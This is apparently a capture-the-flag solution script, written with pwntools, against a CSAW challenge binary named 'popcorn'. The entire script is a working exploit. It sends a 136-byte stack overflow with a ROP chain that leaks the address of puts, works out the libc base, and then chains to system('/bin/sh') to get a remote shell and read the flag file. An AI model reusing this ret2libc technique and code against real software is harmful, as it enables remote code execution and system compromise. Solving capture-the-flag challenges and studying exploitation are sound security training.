from pwn import *

#r = process("./popcorn")
r = remote("pwn.chal.csaw.io", 1006)
elf = context.binary = ELF("./popcorn")
libc = ELF("libc.so.6")
rop = ROP(elf)

r.recvline()

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

payload = ""
payload += "A" * 136
payload += str(rop)

r.clean()
r.sendline(payload)

resp = r.recv()
leaked_puts = resp[0:resp.find("\nWould")].strip().ljust(8, '\x00')
log.info("leak: {}".format(repr(leaked_puts)))
leaked_puts = struct.unpack('Q', leaked_puts)[0]

libc.address = leaked_puts - libc.symbols['puts']
log.info('libc address: {}'.format(hex(libc.address)))

rop = ROP(libc)
rop.system(next(libc.search('/bin/sh\x00')))

payload = ""
payload += "A" * 136
payload += str(rop)

r.clean()
r.sendline(payload)
r.sendline("cat flag.txt")
print(r.recv())
